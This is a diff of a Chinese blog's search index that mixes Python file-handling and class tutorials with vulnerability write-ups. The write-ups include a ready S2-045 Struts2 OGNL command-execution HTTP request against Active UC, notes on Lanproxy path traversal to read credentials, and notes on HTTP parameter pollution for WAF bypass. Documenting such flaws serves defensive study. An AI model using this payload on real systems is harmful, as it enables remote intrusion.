+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
+<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
+<p>可选值：</p>
+<ul>
+<li>0： 从头计算，默认值</li>
+<li>1：从当前位置计算</li>
+<li>2：从最后位置开始计算</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">t</td>
+<td align="center">文本模式（默认）</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="center">写模式，新建文件，如果该文件存在则报错</td>
+</tr>
+<tr>
+<td align="center">b</td>
+<td align="center">二进制模式</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">打开一个文件（可读可写）</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">通用换行模式（不推荐）</td>
+</tr>
+<tr>
+<td align="center">r</td>
+<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
+</tr>
+<tr>
+<td align="center">rb</td>
+<td align="center">以只读方式打开二进制文件（默认）</td>
+</tr>
+<tr>
+<td align="center">r+</td>
+<td align="center">以读写的方式打开一个文件</td>
+</tr>
+<tr>
+<td align="center">rb+</td>
+<td align="center">以读写的方式打开一个二进制文件</td>
+</tr>
+<tr>
+<td align="center">w</td>
+<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb</td>
+<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">w+</td>
+<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb+</td>
+<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a</td>
+<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab</td>
+<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a+</td>
+<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab+</td>
+<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
+<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1206,7 +1478,9 @@
 
 
 
-<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">创建对象</span><br><span class="line">x = MyClass()</span><br><span class="line">调用方法</span><br><span class="line"><span class="comment"># 对象.方法名</span></span><br><span class="line"><span class="comment"># 方法调用会默认传递一个参数</span></span><br><span class="line">x.name = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line">对象的初始化</span><br><span class="line"><span class="comment"># 我们希望在创建对象时，必须设置name属性，不设置就无法创建，而且属性的创建应该是自动完成的</span></span><br><span class="line"><span class="comment"># 创建对象的流程</span></span><br><span class="line"><span class="comment">#	1.创建一个变量</span></span><br><span class="line"><span class="comment"># 	2.创建一个新对象</span></span><br><span class="line"><span class="comment"># 	3.__init__（self）方法执行</span></span><br><span class="line"><span class="comment"># 	4.将对象的id赋值给变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">	<span class="comment"># 在类中可以定义一些特殊方法（魔术方法）</span></span><br><span class="line">	<span class="comment"># 特殊方法都是以__开头，__结尾的方法</span></span><br><span class="line">	<span class="comment"># 特殊方法不需要我们自己调用</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">    	<span class="comment"># print(self)</span></span><br><span class="line">    	<span class="comment"># 通过self向新建的对象中初始化属性</span></span><br><span class="line">        self._name = name <span class="comment">#在实例中定义而不是在类中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大家好，我是%s&#x27;</span>%self.a.name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># p1 = Person()</span></span><br><span class="line">p1 = Person(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">p2 = Person(<span class="string">&#x27;猪八戒&#x27;</span>)</span><br><span class="line">p1.say_hello()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法：</span></span><br><span class="line"><span class="built_in">isinstance</span>() 用来检查一个对象是否是一个类的实例，也可以检查是否是一个父类的子类</span><br><span class="line">变量 = <span class="built_in">isinstance</span>(对象名,类名)</span><br><span class="line"><span class="built_in">issubclass</span>(子类，父类) 检查一个类是否是另一个类的子类</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">isinstance</span>(x,MyClass)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result=&quot;</span>,result)</span><br></pre></td></tr></table></figure>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>当我们调用一个对象的属性时，解析器会在当前对象中寻找是否含有该属性</p>
+<p>如果没有，则去当前类的类对象中去寻找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">创建对象</span><br><span class="line">x = MyClass()</span><br><span class="line">调用方法</span><br><span class="line"><span class="comment"># 对象.方法名</span></span><br><span class="line"><span class="comment"># 方法调用会默认传递一个参数</span></span><br><span class="line">x.name = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line">对象的初始化</span><br><span class="line"><span class="comment"># 我们希望在创建对象时，必须设置name属性，不设置就无法创建，而且属性的创建应该是自动完成的</span></span><br><span class="line"><span class="comment"># 创建对象的流程</span></span><br><span class="line"><span class="comment">#	1.创建一个变量</span></span><br><span class="line"><span class="comment"># 	2.创建一个新对象</span></span><br><span class="line"><span class="comment"># 	3.__init__（self）方法执行</span></span><br><span class="line"><span class="comment"># 	4.将对象的id赋值给变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">	<span class="comment"># 在类中可以定义一些特殊方法（魔术方法）</span></span><br><span class="line">	<span class="comment"># 特殊方法都是以__开头，__结尾的方法</span></span><br><span class="line">	<span class="comment"># 特殊方法不需要我们自己调用</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">    	<span class="comment"># print(self)</span></span><br><span class="line">    	<span class="comment"># 通过self向新建的对象中初始化属性</span></span><br><span class="line">        self._name = name <span class="comment">#在实例中定义而不是在类中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大家好，我是%s&#x27;</span>%self.a.name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># p1 = Person()</span></span><br><span class="line">p1 = Person(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">p2 = Person(<span class="string">&#x27;猪八戒&#x27;</span>)</span><br><span class="line">p1.say_hello()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法：</span></span><br><span class="line"><span class="built_in">isinstance</span>() 用来检查一个对象是否是一个类的实例，也可以检查是否是一个父类的子类</span><br><span class="line">变量 = <span class="built_in">isinstance</span>(对象名,类名)</span><br><span class="line"><span class="built_in">issubclass</span>(子类，父类) 检查一个类是否是另一个类的子类</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">isinstance</span>(x,MyClass)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result=&quot;</span>,result)</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1622,33 +1896,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Active UC index.action远程命令执行漏洞</title>
-    <url>//20f03e999316.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
-
-<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
-<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-        <category>Active-UC</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Lanproxy任意文件读取-CVE-2021-3019</title>
     <url>//0e7fcf3b35d4.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
@@ -1687,6 +1934,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Active UC index.action远程命令执行漏洞</title>
+    <url>//20f03e999316.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
+
+<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
+<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+        <category>Active-UC</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Yapi Mock远程代码执行漏洞</title>
     <url>//8cd1c56722a1.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
@@ -1722,6 +1996,62 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>代码执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HPP参数污染漏洞</title>
+    <url>//4189faf9a367.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
+<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
+<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
+<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
+<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
+<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">web服务器</th>
+<th align="center">获取参数函数</th>
+<th align="center">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“test”)</td>
+<td align="center">last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tomcat</td>
+<td align="center">Request.getParameter(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
+<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>低危漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1836,62 +2166,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HPP参数污染漏洞</title>
-    <url>//4189faf9a367.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
-<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
-<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
